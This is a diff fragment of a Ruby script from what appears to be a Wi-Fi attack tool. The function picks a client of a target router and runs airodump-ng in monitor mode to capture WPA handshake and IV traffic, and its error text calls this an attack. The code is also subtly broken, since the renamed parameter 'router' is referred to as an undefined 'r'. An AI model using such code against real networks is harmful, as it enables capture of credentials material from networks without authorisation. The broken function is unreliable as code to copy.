@@ -1,20 +1,20 @@
 require 'timeout'
 require './monitoring_stopper.rb'
 require './cleaner.rb'
-#Hanshake capture
+# Hanshake capture
 
-def wpa_handler stations = Array.new
+def wpa_handler router = Router.new
 	
-	if stations[0].nil?
+	if r.stations[0].nil?
 		system("clear")
-		abort("Error: No stations found\n Note: There has to be clients using the router\n")
+		abort("Error: No stations found\nNote: In order for this attack to work someone has to be using the router.\n")
 	end
 	
-	# Loop
+	# Begin Loop
 	begin
 		
 		cleaner()
-		s = stations.sample
+		s = r.stations.sample
 		
 		pid = Process.spawn("sudo airodump-ng mon0 --bssid #{s.bssid} -c #{s.channel} -w replay --ivs")
 		begin
